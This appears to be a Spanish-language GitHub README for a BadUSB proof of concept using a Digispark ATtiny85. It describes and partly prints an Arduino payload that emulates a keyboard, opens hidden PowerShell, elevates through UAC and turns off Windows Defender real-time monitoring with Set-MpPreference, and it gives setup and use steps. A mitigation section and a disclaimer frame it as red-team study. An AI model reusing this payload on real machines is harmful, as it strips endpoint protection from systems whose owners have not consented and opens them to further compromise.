🇪🇸 **Español** | 🇬🇧 [English](README-EN.md)

# Digispark HID Attack - Proof of Concept

![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)
![Category: Offensive Security](https://img.shields.io/badge/Field-Red%20Team%20%7C%20Research-red)
![Target: Windows](https://img.shields.io/badge/Target-Windows%2010%2F11-blue)

## ⚠️ Descargo de Responsabilidad (LEER ANTES)

**Este proyecto es EXCLUSIVAMENTE para fines educativos, investigación en seguridad y pruebas de penetración autorizadas.**

El uso de estas técnicas sin consentimiento explícito del propietario del sistema es **ilegal** y constituye un delito. El autor no se responsabiliza del mal uso de esta información. Al descargar este repositorio, usted asume toda la responsabilidad legal y ética sobre su uso.

## 📝 Descripción del Proyecto

Este proyecto presenta una **investigación aplicada** sobre técnicas de inyección HID (BadUSB) utilizando un microcontrolador **Digispark ATtiny85**. El objetivo es **demostrar un vector de ataque físico** que permite ejecutar código en endpoints Windows de forma automatizada.

El payload emula un teclado USB para:
- Abrir "Ejecutar" (Win+R)
- Lanzar PowerShell en modo oculto
- Ejecutar como Administrador
- Deshabilitar la protección en tiempo real de Windows Defender

**Enfoque ofensivo:**
- Comprender el vector de ataque desde la perspectiva de Red Team
- Analizar las implicaciones de seguridad física en entornos corporativos
- Demostrar la efectividad de los ataques HID

## 🎯 Flujo del Ataque

**Versión simplificada:**
`USB → HID → Win+R → PowerShell → Admin → UAC → Defender OFF`

**Versión técnica:**
1. Conexión USB → Emulación de teclado
2. Win + R (Abrir "Ejecutar")
3. PowerShell en modo oculto (-WindowStyle Hidden)
4. Ejecución como Administrador (Ctrl + Shift + Enter)
5. Interacción con UAC (flecha izquierda + Enter)
6. Set-MpPreference -DisableRealtimeMonitoring $true
7. LED encendido (indicador visual)

## 🎯 Objetivos del Proyecto

- ✅ Demostrar que **acceso físico = compromiso total** en segundos
- ✅ Evadir defensas de software mediante emulación de teclado
- ✅ Automatizar post-explotación con PowerShell

## 🛡️ Defensive Perspective (Mitigaciones)

Aunque este proyecto demuestra un vector de ataque físico mediante emulación HID, existen varias medidas que las organizaciones pueden implementar para reducir significativamente el riesgo.

### Controles de Seguridad Recomendados

**1. Control de Dispositivos USB**
- Implementar soluciones de **Device Control / Endpoint Protection**
- Restringir dispositivos USB no autorizados
- Permitir únicamente dispositivos aprobados por la organización

**2. Configuración de UAC**
- Establecer **User Account Control (UAC)** en modo **"Always Notify"**
- Esto impide que el payload se ejecute automáticamente sin interacción del usuario

**3. Endpoint Detection and Response (EDR)**
- Muchas soluciones EDR detectan comportamientos como:
  - Lanzamiento automático de PowerShell
  - Comandos que modifican configuraciones de Defender
  - Ejecución de procesos sospechosos desde Run (Win+R)

**4. Políticas de PowerShell**
- Implementar **PowerShell Constrained Language Mode**
- Restringir ejecución de scripts no firmados
- Activar **PowerShell Logging**

**5. Concienciación de Usuarios**
- Capacitar empleados sobre los riesgos de **USB desconocidos**
- Implementar políticas de **"No conectar dispositivos externos"**

### Conclusión de Seguridad

Este ataque demuestra un principio fundamental en ciberseguridad:

> **El acceso físico a un sistema puede equivaler a compromiso total si no existen controles adecuados.** 

## 🧪 Limitaciones del Ataque

| Limitación | Implicación |
|------------|-------------|
| **UAC** | En configuraciones "Siempre notificar", el ataque requiere interacción manual |
| **Idioma del sistema** | La navegación con flecha izquierda asume interfaz en español/inglés |
| **Detección por EDR** | El comando `Set-MpPreference` es conocido y monitoreado |
| **Timing** | Delays hardcodeados pueden fallar en sistemas lentos |
| **Privilegios** | Requiere que el usuario sea administrador |

**Nota para Red Team:** Documentar limitaciones es parte del trabajo. Saber cuándo un ataque funciona y cuándo no es lo que diferencia a un profesional.

## 🛠️ Requisitos Técnicos

| Componente | Especificación |
|------------|----------------|
| Hardware | Digispark ATtiny85 (o compatible) |
| Software | Arduino IDE + soporte Digispark |
| Librería | DigiKeyboard.h |
| Target | Windows 10 / 11 (para pruebas) |

## 🚀 Instalación y Uso

### Configurar entorno Arduino para Digispark

1. Abre Arduino IDE
2. Ve a Archivo → Preferencias → "URLs adicionales de Gestor de placas"
3. Añade: `http://digistump.com/package_digistump_index.json`
4. Herramientas → Placa → Gestor de tarjetas → Busca "Digistump" e instala
5. Selecciona placa: "Digispark (Default - 16.5mhz)"

### Cargar el código

```bash
# Clona el repositorio
git clone https://github.com/TU_USUARIO/Digispark-HID-Attack-PoC.git
# Abre src/payload.ino en Arduino IDE
# Conecta el Digispark
# Haz clic en "Subir" (el IDE pedirá conectar el dispositivo)
# ¡Desconéctalo inmediatamente después de la carga!
```

### Ejecutar (SOLO EN ENTORNO CONTROLADO)

1. Conecta el Digispark al equipo de pruebas
2. El payload se ejecutará automáticamente en segundos
3. El LED se encenderá al finalizar

## 📂 Estructura del Proyecto

```
├── README.md          # Esta documentación
├── DISCLAIMER.md      # Aviso legal
├── LICENSE            # Licencia MIT
├── .gitignore         # Archivos ignorados
├── src/
│   └── payload.ino    # Código fuente del payload
└── docs/
    └── analysis.md    # Análisis técnico y forense
```
 
## 🔬 Análisis Técnico del Código

```c
// Abrir Ejecutar (Win+R)
DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);

// PowerShell oculto con comando
DigiKeyboard.print("powershell -WindowStyle Hidden -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");

// Ejecutar como Admin (Ctrl+Shift+Enter)
DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);

// Aceptar UAC
DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
DigiKeyboard.sendKeyStroke(KEY_ENTER);
```

**Características:**
- ✅ Simple y probado (menos propenso a errores)
- ✅ Comentarios claros
- ✅ LED de estado al finalizar
- ✅ Bucle infinito para evitar re-ejecución

## 📚 Conceptos Aprendidos

Este laboratorio permite comprender varios conceptos importantes dentro de la seguridad ofensiva y defensiva.

### Conceptos Técnicos

- **HID Injection Attacks**  
  Uso de dispositivos que emulan teclados para ejecutar comandos automáticamente.

- **BadUSB Threat Model**  
  Riesgos asociados a dispositivos USB aparentemente inofensivos.

- **PowerShell Post-Exploitation**  
  Uso de PowerShell para ejecutar acciones posteriores a la explotación inicial.

- **User Account Control (UAC)**  
  Comprender cómo funciona y cuándo puede limitar ataques automatizados.

- **Seguridad Física en Endpoints**  
  Demuestra que los ataques no siempre requieren acceso remoto.

### Habilidades Desarrolladas

Este proyecto ayudó a practicar:

- Investigación en seguridad ofensiva
- Automatización de ataques mediante HID
- Documentación técnica de vulnerabilidades
- Análisis de limitaciones de ataques reales
- Comprensión de mitigaciones defensivas

### Enfoque Educativo

El objetivo principal de este laboratorio es **entender cómo funcionan estos ataques para poder defenderse mejor de ellos en entornos reales.**

## 🎥 Video Demostración

A continuación se muestra una demostración del funcionamiento del dispositivo al ser conectado a un sistema Windows en un entorno de laboratorio controlado.

En el video se puede observar:

1. Conexión del Digispark
2. Ejecución automática del payload
3. Apertura de la ventana "Run"
4. Lanzamiento de PowerShell
5. Ejecución del comando automatizado

⚠️ Esta demostración fue realizada **exclusivamente en un entorno de laboratorio controlado para fines educativos.**

[![Watch the demo](https://img.youtube.com/vi/6TkrJ9Ly8XQ/0.jpg)](https://www.youtube.com/shorts/6TkrJ9Ly8XQ)

#### 👨‍💻 Autor

**Fred Castillo**  
*Aspirante a Red Team | Seguridad Ofensiva*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Fred%20Castillo-0077B5?style=for-the-badge&logo=linkedin)](https://www.linkedin.com/in/fredcastillo11/)
[![GitHub](https://img.shields.io/badge/GitHub-fredcastillo-100000?style=for-the-badge&logo=github)](https://github.com/fredcastillo)
